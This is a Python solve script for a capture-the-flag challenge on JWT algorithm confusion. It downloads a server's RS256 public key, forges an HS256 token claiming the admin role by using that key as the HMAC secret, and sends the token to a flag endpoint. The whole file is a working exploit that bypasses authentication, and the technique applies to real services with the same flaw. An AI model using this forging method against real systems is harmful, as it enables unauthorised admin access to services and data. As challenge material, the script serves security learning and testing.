"""
solve.py – Automated exploit for the Boring Corp JWT Algorithm Confusion challenge.

Attack flow:
  1. Fetch RS256 public key from /api/public-key.
  2. Craft a new JWT with { role: "admin" }, algorithm=HS256, signing with the
     public key bytes used as the HMAC-SHA256 secret.
  3. Send the forged token to /api/flag.

Usage:
    pip install requests PyJWT cryptography
    python3 solve.py <CHALLENGE_URL>

Example:
    python3 solve.py http://localhost:5002
"""

import sys
import base64
import hashlib
import hmac as _hmac
import json
import requests


def _forge_hs256(payload: dict, secret: str) -> str:
    """Forge an HS256 JWT signed with any string as the HMAC-SHA256 secret.

    PyJWT 2.x refuses jwt.encode() with a PEM key as the HS256 secret, so we
    build and sign the token manually instead.
    """
    def b64url(data: bytes | str) -> str:
        if isinstance(data, str):
            data = data.encode()
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    header  = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    body    = b64url(json.dumps(payload, separators=(",", ":")))
    signing = f"{header}.{body}"
    sig = _hmac.new(secret.strip().encode("utf-8"), signing.encode("utf-8"), hashlib.sha256).digest()
    return f"{signing}.{b64url(sig)}"


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    base = sys.argv[1].rstrip("/")
    print(f"[*] Target: {base}\n")

    # -----------------------------------------------------------------------
    # Step 1 – grab the public key
    # -----------------------------------------------------------------------
    r = requests.get(f"{base}/api/public-key", timeout=10)
    r.raise_for_status()
    public_key_pem = r.text.strip()
    print("[+] Public key retrieved:")
    print(public_key_pem[:80] + " …\n")

    # -----------------------------------------------------------------------
    # Step 2 – forge an HS256 token signed with the public key as the secret
    # -----------------------------------------------------------------------
    # PyJWT 2.x rejects jwt.encode() when the secret is a PEM-format asymmetric
    # key, so we build and sign the token manually using hmac + hashlib.
    forged_token = _forge_hs256(
        {"username": "attacker", "role": "admin"},
        public_key_pem,
    )
    print(f"[+] Forged HS256 token:\n{forged_token}\n")

    # -----------------------------------------------------------------------
    # Step 3 – call /api/flag with the forged token
    # -----------------------------------------------------------------------
    r = requests.get(
        f"{base}/api/flag",
        headers={"Authorization": f"Bearer {forged_token}"},
        timeout=10,
    )
    data = r.json()
    print(f"[+] HTTP {r.status_code}")
    if "flag" in data:
        print(f"\n🏁  FLAG: {data['flag']}")
    else:
        print(f"[-] Error: {data}")


if __name__ == "__main__":
    main()
